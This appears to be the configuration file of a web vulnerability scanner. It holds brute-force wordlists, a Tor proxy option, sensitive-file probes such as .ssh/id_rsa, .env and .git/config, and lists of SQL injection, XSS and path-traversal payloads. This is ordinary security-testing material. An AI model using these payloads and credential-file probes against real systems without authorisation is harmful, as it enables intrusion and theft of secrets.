USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

REQUEST_TIMEOUT = 15
REQUEST_RETRIES = 2
TIMEOUT = REQUEST_TIMEOUT
TLS_VERIFY = True
REQUEST_HEADERS = {}

REQUESTS_PER_SECOND = 10
MAX_THREADS = 10
MAX_CRAWL_DEPTH = 3
MAX_CRAWL_PAGES = 150







TRANSPORT_MODE = "direct"
TRANSPORT_PROXIES = {}
TRANSPORT_PROXY_URL = ""
TRANSPORT_LABEL = "DIRECT"

TOR_ROOT = None
TOR_SOCKS_HOST = "127.0.0.1"
TOR_SOCKS_PORT = 9050
TOR_DATA_DIR = "output/tor"
TOR_START_TIMEOUT = 60.0

DIR_EXTENSIONS = ["", ".php", ".html", ".bak", ".old", ".zip", ".txt", ".json", ".xml"]
DIR_EXTENSIONS_FULL = [
    "", ".php", ".html", ".htm", ".asp", ".aspx", ".jsp",
    ".txt", ".bak", ".old", ".zip", ".tar.gz", ".sql",
    ".log", ".xml", ".json", ".yml", ".env", ".config",
    ".inc", ".conf", ".ini", ".swp", ".db", ".sqlite",
]

SITEMAP_PATHS = [
    "/sitemap.xml", "/sitemap_index.xml", "/sitemap.xml.gz",
    "/sitemap-index.xml", "/wp-sitemap.xml",
]

CDN_HINTS = {
    "Netlify": ["netlify", "x-nf-request-id", "x-netlify"],
    "Cloudflare": ["cloudflare", "cf-ray"],
    "Vercel": ["vercel", "x-vercel"],
    "GitHub Pages": ["github.com", "githubpages"],
    "Amazon S3": ["amazonaws.com", "x-amz-request-id"],
    "Firebase": ["firebase", "firebaseapp"],
    "Render": ["render.com"],
    "Fly.io": ["fly.io"],
}


COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 81, 110, 111, 135, 139, 143, 161, 389,
    443, 445, 465, 514, 587, 636, 993, 995, 1080, 1433, 1521, 2049,
    2082, 2083, 2086, 2087, 3306, 3389, 5432, 5900, 5985, 5986,
    6379, 8000, 8008, 8080, 8443, 8888, 9090, 9200, 9300, 27017, 27018
]

SQLI_PAYLOADS = [
    "'", "''", "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*",
    "\" OR \"1\"=\"1", "' OR 1=1 --", "' OR 1=1#", "') OR ('1'='1",
    "1' ORDER BY 1--", "1' ORDER BY 100--", "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--", "' AND 1=CONVERT(int,@@version)--",
    "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--",
    "1; SELECT pg_sleep(5)--", "' OR BENCHMARK(5000000,SHA1('test'))--",
    "admin'--", "1 OR 1=1", "' HAVING 1=1--", "' GROUP BY 1--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "javascript:alert(1)",
    "\" onfocus=alert(1) autofocus=\"",
    "' onmouseover='alert(1)'",
    "<iframe src='javascript:alert(1)'>",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=x d='M0'><animate attributeName=d values='M0' begin=x.click /></textarea></mtext></svg></mglyph></table></mtext></math>",
    "${alert(1)}",
    "{{constructor.constructor('alert(1)')()}}",
]

LFI_PAYLOADS = [
    "../../../etc/hostname", "....//....//....//etc/hostname",
    "..\\..\\..\\windows\\win.ini", "....\\....\\....\\windows\\win.ini",
    "/etc/hostname", "../../../../../../etc/hostname",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhostname",
    "..%252f..%252f..%252fetc%252fhostname",
    "....//....//....//....//etc/hostname%00",
    "/etc/os-release", "file:///c:/windows/win.ini",
]

SENSITIVE_PATHS = [
    ".env", ".git/config", ".git/HEAD", ".gitignore", ".svn/entries",
    ".htaccess", ".htpasswd", ".DS_Store", "web.config", "wp-config.php",
    "wp-config.php.bak", "configuration.php", "config.php", "config.inc.php",
    "config.yml", "config.yaml", "database.yml", "settings.py",
    "phpinfo.php", "info.php", "test.php", "server-status", "server-info",
    "elmah.axd", "trace.axd", "crossdomain.xml", "clientaccesspolicy.xml",
    "backup.sql", "dump.sql", "database.sql", "db.sql", "data.sql",
    "backup.zip", "backup.tar.gz", "site.tar.gz", "www.zip",
    ".bash_history", ".ssh/id_rsa", ".ssh/authorized_keys",
    "composer.json", "package.json", "Gruntfile.js", "Gulpfile.js",
    "Makefile", "Dockerfile", "docker-compose.yml", ".dockerignore",
    "robots.txt", "sitemap.xml", "humans.txt", "security.txt",
    ".well-known/security.txt", "readme.html", "readme.txt", "README.md",
    "CHANGELOG.md", "LICENSE", "api/swagger.json", "swagger-ui.html",
    "api-docs", "graphql", "debug", "console", "actuator", "actuator/health",
    "actuator/env", "metrics", "health", "status",
]

ADMIN_PATHS = [
    "admin", "administrator", "admin.php", "admin.html", "admin/login",
    "admin/index.php", "adminpanel", "admin1", "admin2",
    "wp-admin", "wp-login.php", "wp-admin/admin-ajax.php",
    "cpanel", "phpmyadmin", "pma", "myadmin", "mysql",
    "manager", "manager/html", "jmx-console",
    "login", "login.php", "signin", "auth", "authenticate",
    "dashboard", "dashboard/login", "panel", "controlpanel",
    "webadmin", "siteadmin", "cms", "cms/login",
    "user/login", "account/login", "members",
    "portal", "backend", "backoffice", "manage",
    "_admin", "admin_area", "site_admin",
]

SUBDOMAINS_WORDLIST = [
    "www", "mail", "ftp", "smtp", "pop", "ns1", "ns2", "dns",
    "webmail", "mx", "blog", "dev", "staging", "test", "api",
    "app", "beta", "demo", "docs", "git", "jenkins", "jira",
    "cdn", "cloud", "db", "sql", "mysql", "postgres", "redis",
    "admin", "portal", "dashboard", "panel", "cpanel", "whm",
    "webdisk", "autodiscover", "autoconfig", "imap", "pop3",
    "vpn", "remote", "gateway", "proxy", "firewall", "fw",
    "monitor", "nagios", "zabbix", "grafana", "elk", "kibana",
    "shop", "store", "pay", "billing", "invoice",
    "support", "help", "helpdesk", "ticket", "status",
    "wiki", "confluence", "sharepoint", "intranet",
    "m", "mobile", "wap", "assets", "static", "img", "images",
    "media", "upload", "files", "downloads",
    "old", "new", "v1", "v2", "stage", "uat", "qa", "prod",
    "backup", "bak", "temp", "tmp", "cache",
    "auth", "sso", "login", "id", "oauth",
    "ci", "cd", "deploy", "build", "release",
    "api-v1", "api-v2", "rest", "graphql", "ws", "websocket",
    "s3", "storage", "bucket", "minio",
    "elk", "elastic", "logstash", "log", "logs", "syslog",
    "docker", "k8s", "kubernetes", "rancher", "swarm",
    "sandbox", "lab", "internal", "private", "secret",
    "crm", "erp", "hr", "finance",
]

DIR_WORDLIST = [
    "images", "img", "css", "js", "fonts", "assets", "static",
    "media", "uploads", "files", "documents", "docs", "download",
    "includes", "inc", "lib", "libs", "vendor", "node_modules",
    "wp-content", "wp-includes", "wp-admin", "themes", "plugins",
    "admin", "administrator", "login", "dashboard", "panel",
    "api", "api/v1", "api/v2", "rest", "graphql", "swagger",
    "config", "conf", "settings", "setup", "install",
    "backup", "backups", "bak", "old", "temp", "tmp", "cache",
    "test", "tests", "testing", "debug", "dev", "staging",
    "cgi-bin", "scripts", "bin", "server", "data", "database",
    "log", "logs", "error_log", "access_log",
    "private", "secret", "hidden", "internal",
    "phpmyadmin", "pma", "mysql", "sql", "db",
    "email", "mail", "webmail", "smtp",
    "user", "users", "account", "accounts", "profile", "member",
    "register", "signup", "signin", "auth", "oauth",
    "search", "results", "query",
    "forum", "blog", "news", "press", "article", "post",
    "shop", "store", "cart", "checkout", "payment", "order",
    "about", "contact", "faq", "help", "support", "feedback",
    "terms", "privacy", "policy", "legal", "disclaimer",
    "sitemap", "robots", "favicon", "manifest",
    "xmlrpc.php", "wp-cron.php", "wp-config.php",
    ".git", ".svn", ".hg", ".env", ".htaccess",
    "server-status", "server-info", "status", "health",
    "metrics", "monitor", "trace", "console",
    "uploads", "upload", "file", "attachment",
    "report", "reports", "analytics", "stats", "statistics",
    "export", "import", "migrate", "update", "upgrade",
    "error", "errors", "404", "500",
    "src", "source", "build", "dist", "public", "www", "html",
    "templates", "views", "layouts", "components", "modules",
    "resources", "res", "asset", "content",
    "redirect", "go", "out", "link", "url", "r",
    "feed", "rss", "atom", "xml", "json", "yaml",
    "socket", "ws", "websocket", "hub", "connect",
    "proxy", "gateway", "service", "services", "microservice",
    "webhook", "hook", "callback", "notify", "event",
    "batch", "job", "jobs", "task", "tasks", "queue", "worker",
    "cron", "schedule", "scheduler",
    "archive", "archives", "history", "version", "versions",
    "demo", "example", "sample", "prototype", "poc",
    "toolkit", "tools", "utility", "utilities", "helper",
]










STAGE_LIMITS = {
    "default": {
        "crawl_pages": 400,
        "crawl_depth": 4,
        "js_bundles": 60,
        "js_bytes": 6_000_000,
        "inline_scripts": 60,
        "extraction_pages": 300,
        "injection_budget": 1200,
        "brute_budget": 6000,
        "param_probe_names": 45,
        "spec_endpoints": 400,
        "passive_sources": True,
    },
    "deep": {
        "crawl_pages": 2500,
        "crawl_depth": 7,
        "js_bundles": 250,
        "js_bytes": 30_000_000,
        "inline_scripts": 200,
        "extraction_pages": 1500,
        "injection_budget": 9000,
        "brute_budget": 40000,
        "param_probe_names": 120,
        "spec_endpoints": 2000,
        "passive_sources": True,
    },
}



WELL_KNOWN_PATHS = [
    "security.txt", ".well-known/security.txt", "humans.txt", "manifest.json",
    "site.webmanifest", "browserconfig.xml", "opensearch.xml", "ads.txt",
    "app-ads.txt", "llms.txt", "llms-full.txt", "license.txt", "licenses.txt",
    "changelog.txt", "CHANGELOG.md", "version", "version.txt", "build.txt",
    "build-info", "build.json", "revision.txt", "release.json", "VERSION",
    "README.md", "README.txt", "INSTALL.txt", "TODO.md", "TODO.txt", "NOTES.md",
    "CONTRIBUTING.md", ".env.example", ".env.sample", ".env.template",
    ".env.dist", ".env.local", ".env.development", ".env.production",
    ".env.staging", "env.js", "env.json", "config.json", "config.yaml",
    "config.yml", "app.config", "appsettings.json",
    "appsettings.Development.json", "settings.py", "settings.json",
    "web.config", "Web.Debug.config", "Web.Release.config", "phpinfo.php",
    "info.php", "test.php", "i.php", "pi.php", "server-status", "server-info",
    "elmah.axd", "trace.axd", "metrics", "health", "healthz", "ready", "readyz",
    "livez", "status", "ping", "actuator", "actuator/health", "actuator/env",
    "actuator/info", "actuator/beans", "actuator/configprops", "_profiler",
    "_debug", "debug/pprof", "debug/vars", "graphiql", "playground", "altair",
    "swagger-ui.html", "swagger-ui/", "swagger/index.html", "swagger.json",
    "swagger.yaml", "swagger/v1/swagger.json", "api-docs", "api/docs",
    "apidocs", "openapi.json", "openapi.yaml", "redoc", "wp-json",
    "wp-json/wp/v2/users", "wp-json/wp/v2/posts", "xmlrpc.php", "wp-cron.php",
]



API_SPEC_PATHS = [
    "openapi.json", "openapi.yaml", "openapi.yml", "swagger.json",
    "swagger.yaml", "swagger.yml", "api-docs", "v2/api-docs", "v3/api-docs",
    "api/openapi.json", "api/openapi.yaml", "api/swagger.json",
    "api/swagger.yaml", "api/docs", "api/docs.json", "docs/api.json",
    "docs/openapi.json", "spec/openapi.json", "api-docs.json", "openapi",
    "swagger", "_catalog/api-docs", "services/openapi.json",
]


GIT_PATHS = [
    ".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD",
    ".git/packed-refs", ".git/refs/heads/master", ".git/refs/heads/main",
    ".git/description", ".git/COMMIT_EDITMSG", ".git/info/refs",
    ".svn/entries", ".svn/wc.db", ".hg/requires", ".bzr/README",
]



SOURCE_MAP_HINTS = ["sourceMappingURL", "//# sourceURL"]





PARAM_PROBE_NAMES = [
    "id", "ID", "Id", "uid", "user_id", "userId", "item_id", "itemId",
    "uuid", "guid", "slug", "key", "name", "username", "user", "login",
    "email", "q", "query", "search", "s", "keyword", "term", "text", "words",
    "page", "p", "pageSize", "page_size", "limit", "offset", "start", "cursor",
    "num", "n", "count", "size", "per_page", "next", "filter", "sort",
    "order", "orderby", "order_by", "category", "cat", "type", "kind",
    "file", "filename", "path", "filepath", "doc", "document", "download",
    "url", "uri", "link", "src", "dest", "destination", "target", "return",
    "redirect", "redirect_uri", "returnUrl", "return_url", "continue", "go",
    "lang", "locale", "language", "ref", "referrer", "source", "date",
    "from", "to", "start_date", "end_date", "year", "month", "token",
    "api_key", "secret", "code", "view", "action", "do", "op", "cmd",
    "module", "controller", "func", "format", "output", "callback", "jsonp",
    "debug", "verbose", "test", "include", "load", "template", "theme", "v",
    "version", "parent_id", "child_id", "content_id", "post_id", "thread_id",
]



PARAM_PROBE_DELTA = 40



LIB_VERSION_SIGNATURES = [
    ("jQuery", r"jQuery(?: JavaScript Library )? v?(\d+\.\d+(?:\.\d+)?)"),
    ("React", r"React(?: v| version)?(\d+\.\d+\.\d+)"),
    ("Angular", r"angular[.-]version[\"':=\s]+(\d+\.\d+\.\d+)"),
    ("Vue", r"Vue(?: v)?\.js (?:v)?(\d+\.\d+\.\d+)"),
    ("Bootstrap", r"Bootstrap v(\d+\.\d+(?:\.\d+)?)"),
    ("Lodash", r"lodash[.-](\d+\.\d+\.\d+)"),
    ("Moment.js", r"Moment(?:.js)?(?: v)?(\d+\.\d+\.\d+)"),
    ("Axios", r"axios(?:/| v)?(\d+\.\d+\.\d+)"),
    ("Handlebars", r"Handlebars(?: v)?(?:\s+)?(?:v)?(\d+\.\d+\.\d+)"),
    ("D3", r"d3(?: v)?(?:\s+)?v(\d+\.\d+\.\d+)"),
    ("Three.js", r"THREE\.REVISION[\"'=:\s]+(\d+)"),
    ("Chart.js", r"Chart\.js v(\d+\.\d+\.\d+)"),
    ("Socket.IO", r"socket\.io(?:-client)? v?(\d+\.\d+\.\d+)"),
    ("Next.js", r"next@(\d+\.\d+\.\d+)"),
    ("Nuxt", r"nuxt@(\d+\.\d+\.\d+)"),
    ("Swiper", r"Swiper(?: v)? ?(\d+\.\d+\.\d+)"),
    ("jQuery UI", r"jQuery UI (\d+\.\d+(?:\.\d+)?)"),
    ("Font Awesome", r"Font Awesome (?:Free )?(\d+\.\d+(?:\.\d+)?)"),
]



EOL_LIBRARIES = {
    "jQuery": "1.x - migrate to 3.x; 2.x and below are unpatched",
    "Angular": "1.x - AngularJS reached end of life",
    "Vue": "2.x - Vue 2 reached end of life in 2023-12-31",
    "AngularJS": "reached end of life 2022-01",
    "Moment.js": "legacy in maintenance mode",
    "Handlebars": "4.7.7 and below - prototype pollution history",
    "Lodash": "4.17.20 and below - prototype pollution history",
}


METHOD_PROBE = ["OPTIONS", "TRACE", "PUT", "DELETE", "PROPFIND", "PATCH"]


INFO_HEADERS = [
    "Server", "X-Powered-By", "X-AspNet-Version", "X-AspNetMvc-Version",
    "X-Powered-CMS", "X-Generator", "X-Drupal-Cache", "X-Varnish",
    "X-Cache", "X-Served-By", "X-Backend-Server", "X-Upstream",
    "Via", "X-Request-Id", "X-Runtime", "X-Response-Times", "X-Request-Start",
    "X-Limit-RateLimit", "X-RateLimit-Limit", "X-RateLimit-Remaining",
    "X-Content-Type-Options", "X-Request-ID", "Front-End-Https",
]
